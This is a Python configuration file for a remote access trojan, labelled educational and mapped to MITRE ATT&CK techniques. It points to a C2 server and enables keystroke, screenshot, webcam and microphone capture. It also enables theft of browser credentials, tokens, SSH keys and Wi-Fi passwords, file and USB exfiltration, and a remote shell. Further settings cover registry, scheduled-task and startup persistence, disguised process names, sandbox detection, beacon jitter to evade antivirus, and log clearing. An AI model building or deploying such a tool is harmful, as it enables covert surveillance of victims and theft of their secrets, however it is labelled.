"""
RAT Configuration - EDUCATIONAL PURPOSE ONLY
Change C2_HOST to your Kali VM's IP address before running.
"""

# ===== CHANGE THIS TO YOUR KALI VM IP =====
C2_HOST = "192.168.1.101"  # This laptop's WiFi IP (C2 server runs here)
C2_PORT = 4444

# Kill switch - set to True to stop the RAT
KILL_SWITCH = False

# What to collect
COLLECT_SYSTEM_INFO = True
COLLECT_FILES = True
COLLECT_SCREENSHOTS = True
COLLECT_KEYSTROKES = True

# File recon settings
MAX_FILE_SIZE_MB = 5  # Don't exfiltrate files larger than this
FILE_EXTENSIONS = [".txt", ".pdf", ".docx", ".xlsx", ".csv", ".json", ".env", ".config"]
SCAN_DIRECTORIES = ["Desktop", "Documents", "Downloads"]  # Relative to user home

# Keylogger settings
KEYLOG_INTERVAL_SECONDS = 30  # Send keystrokes every 30 seconds

# Screenshot settings
SCREENSHOT_INTERVAL_SECONDS = 60  # Take screenshot every 60 seconds

# RAT identifier
RAT_NAME = "edu_rat_rmit"
RAT_PROCESS_NAME = "system_update_service"

# ===== NEW: Encryption (T1573.001) =====
C2_PASSPHRASE = "rmit-edu-demo-2026"  # Pre-shared key for AES-256
ENCRYPT_COMMS = True  # Toggle encrypted C2 communications

# ===== NEW: Persistence (T1547.001) =====
ENABLE_PERSISTENCE = True  # Registry Run key persistence
PERSISTENCE_NAME = "WindowsSecurityHealth"  # Registry value name

# ===== NEW: Evasion (T1497.001, T1036, T1564.003) =====
STEALTH_MODE = False  # Console hiding (False for dev/demo)
CHECK_VM = True  # VM/sandbox detection

# ===== NEW: Collection Modules =====
COLLECT_CLIPBOARD = True  # Clipboard capture (T1115)
COLLECT_BROWSER_DATA = True  # Browser credential extraction (T1555.003)
COLLECT_PRIVILEGE_INFO = True  # Privilege recon (T1033)
CLIPBOARD_INTERVAL_SECONDS = 10  # Clipboard poll rate

# ===== NEW: Reconnection =====
RECONNECT_ENABLED = True  # Auto-reconnect if C2 drops
RECONNECT_BASE_DELAY = 5  # Initial retry delay (seconds)
RECONNECT_MAX_DELAY = 300  # Max retry delay (5 min)
RECONNECT_MAX_ATTEMPTS = 50  # Give up threshold

# ===== NEW: Remote Command Execution (T1059.003) =====
ENABLE_REMOTE_CMD = True  # Remote shell toggle
CMD_POLL_INTERVAL = 15  # Poll C2 for commands every 15 seconds

# ===== NEW: Wi-Fi Password Extraction (T1552.001) =====
COLLECT_WIFI_PASSWORDS = True  # Extract saved Wi-Fi passwords (not just names)

# ===== NEW: Token & Secret Harvesting (T1528, T1552.001) =====
COLLECT_TOKENS = True  # Discord tokens, SSH keys, cloud creds, .env files

# ===== NEW: Network Reconnaissance (T1049, T1018, T1016) =====
COLLECT_NETWORK_RECON = True  # ARP table, connections, DNS cache, shares

# ===== NEW: C2 Beacon Jitter (Anti-detection) =====
# Adds ±JITTER_PERCENT randomness to all intervals to defeat
# statistical beacon analysis (the AV's beacon detection checks
# for regular intervals with std_dev < 5s)
BEACON_JITTER = True  # Enable timing randomization
JITTER_PERCENT = 30   # ±30% randomness on all intervals

# ===== NEW: Lateral Movement Recon (T1135, T1087.002, T1046) =====
COLLECT_LATERAL_RECON = True  # Port scan + share enumeration + domain info

# ===== NEW: Event Log Tampering (T1070.001, T1562.002) =====
COLLECT_EVENT_LOG_INFO = True   # Enumerate event logs (always safe, read-only)
CLEAR_EVENT_LOGS = False        # Clear forensic logs (DANGEROUS - requires admin, disabled by default)

# ===== NEW: Anti-Forensics (T1070.004) =====
# On kill switch: wipe temp files, loot artifacts, and event traces
ANTI_FORENSICS = True  # Clean up on self-destruct

# ===== NEW: Webcam Capture (T1125) =====
COLLECT_WEBCAM = True  # Capture images from webcam
WEBCAM_INTERVAL_SECONDS = 120  # Webcam capture every 2 minutes
WEBCAM_CAMERA_INDEX = 0  # Default camera (0 = built-in)

# ===== NEW: Microphone Capture (T1123) =====
COLLECT_MICROPHONE = True  # Record audio from microphone
MICROPHONE_DURATION_SECONDS = 10  # Recording length per capture
MICROPHONE_INTERVAL_SECONDS = 180  # Record every 3 minutes
MICROPHONE_SAMPLE_RATE = 16000  # 16kHz (good quality, small size)

# ===== NEW: Scheduled Task Persistence (T1053.005) =====
ENABLE_SCHEDULED_TASK = True  # Scheduled task as alternative persistence
ENABLE_STARTUP_FOLDER = True  # Startup folder .bat as third persistence

# ===== NEW: USB Monitor (T1025) =====
COLLECT_USB_DATA = True  # Scan removable drives for interesting files
USB_POLL_INTERVAL = 30  # Check for new USB drives every 30 seconds

# ===== NEW: Geolocation (T1016, T1614.001) =====
COLLECT_GEOLOCATION = True  # IP-based geolocation + locale info

# ===== NEW: Process Injection Recon (T1055) =====
COLLECT_INJECTION_RECON = True  # Enumerate injectable processes (READ-ONLY)

# ===== NEW: Email Harvesting (T1087.003, T1114.001) =====
COLLECT_EMAIL_DATA = True  # Harvest email profiles and credentials
